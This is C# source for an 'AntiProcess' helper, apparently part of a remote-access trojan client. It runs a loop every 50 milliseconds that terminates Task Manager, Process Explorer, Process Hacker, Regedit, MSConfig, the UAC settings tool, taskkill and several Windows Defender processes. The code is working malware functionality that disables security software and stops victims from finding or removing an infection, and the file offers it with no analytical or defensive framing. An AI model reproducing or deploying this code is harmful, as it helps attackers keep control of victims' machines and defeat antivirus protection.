using System;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Threading;

namespace Client.Helper
{
    public static class AntiProcess
    {
        private static Thread BlockThread = new Thread(Block);
        public static bool Enabled { get; set; }

        //Start anti process 
        public static void StartBlock()
        {
            Enabled = true;
            BlockThread.Start();
        }

        //Stop anti process 
        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void StopBlock()
        {
            Enabled = false;
            try
            {
                BlockThread.Abort();
                BlockThread = new Thread(Block);
            }
            catch { }
        }

        //Check to kill processes in a loop
        private static void Block()
        {
            while (Enabled)
            {
                IntPtr snapshot = CreateToolhelp32Snapshot(0x00000002u, 0u);
                PROCESSENTRY32 entry = new PROCESSENTRY32();
                entry.dwSize = (uint) Marshal.SizeOf(typeof(PROCESSENTRY32));
                if (Process32First(snapshot, ref entry))
                    do
                    {
                        uint id = entry.th32ProcessID;
                        string name = entry.szExeFile;

                        if (Matches(name, "Taskmgr.exe") ||
                            Matches(name, "ProcessHacker.exe") ||
                            Matches(name, "procexp.exe") ||
                            Matches(name, "MSASCui.exe") ||
                            Matches(name, "MsMpEng.exe") ||
                            Matches(name, "MpUXSrv.exe") ||
                            Matches(name, "MpCmdRun.exe") ||
                            Matches(name, "NisSrv.exe") ||
                            Matches(name, "ConfigSecurityPolicy.exe") ||
                            Matches(name, "MSConfig.exe") ||
                            Matches(name, "Regedit.exe") ||
                            Matches(name, "UserAccountControlSettings.exe") ||
                            Matches(name, "taskkill.exe"))
                            KillProcess(id);
                    } while (Process32Next(snapshot, ref entry));

                CloseHandle(snapshot);
                Thread.Sleep(50);
            }
        }

        //If process name matches 
        private static bool Matches(string source, string target)
        {
            return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase);
        }

        //Kill process 
        private static void KillProcess(uint processId)
        {
            IntPtr process = OpenProcess(0x0001u, false, processId);
            TerminateProcess(process, 0);
            CloseHandle(process);
        }

        #region DLL Imports

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll")]
        private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll")]
        private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll")]
        private static extern bool TerminateProcess(IntPtr dwProcessHandle, int exitCode);

        #endregion
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }
}